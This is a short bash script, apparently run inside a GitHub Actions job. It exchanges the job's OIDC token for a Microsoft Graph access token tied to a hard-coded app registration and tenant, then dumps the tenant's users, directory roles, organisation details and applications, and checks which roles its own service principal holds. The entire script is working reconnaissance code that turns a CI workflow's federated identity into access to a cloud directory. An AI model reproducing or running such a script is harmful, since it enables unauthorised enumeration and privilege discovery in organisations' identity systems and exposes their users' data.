#!/usr/bin/env bash
set +e
LEG="891fb158-e02c-4428-a885-53b811f369c0"
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
GT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$LEG" -d "grant_type=client_credentials" -d "scope=https://graph.microsoft.com/.default" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "gt=${#GT}"
G() { curl -sS -m 20 -H "Authorization: Bearer $GT" "$1"; }
echo "===== USERS ====="; G "https://graph.microsoft.com/v1.0/users?\$top=50" | python3 -m json.tool | head -120
echo "===== DIRECTORY ROLES ====="; G "https://graph.microsoft.com/v1.0/directoryRoles" | head -c 1500; echo
echo "===== ORG ====="; G "https://graph.microsoft.com/v1.0/organization" | head -c 800; echo
echo "===== APPS full ====="; G "https://graph.microsoft.com/v1.0/applications?\$top=99" | head -c 6000; echo
echo "===== MY ROLES ====="
SPID=$(G "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId%20eq%20%27$LEG%27&\$select=id" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"][0]["id"])')
G "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=principalId%20eq%20%27$SPID%27" | head -c 1200; echo
